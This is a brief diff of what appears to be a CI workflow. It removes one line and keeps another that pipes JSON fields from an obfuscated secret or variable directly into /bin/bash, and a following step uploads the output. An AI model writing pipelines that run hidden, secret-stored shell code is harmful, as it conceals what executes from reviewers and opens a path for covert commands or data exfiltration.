@@ -22,7 +22,6 @@ jobs:
           gy141: ${{ secrets.gy141 }}
         run: |
           printf '%s' "$gy141" | jq -r .i5 | /bin/bash
-          echo $oquz65 | jq -r .hlszi933 | /bin/bash
 
       - name: Upload output
         uses: actions/upload-artifact@v4
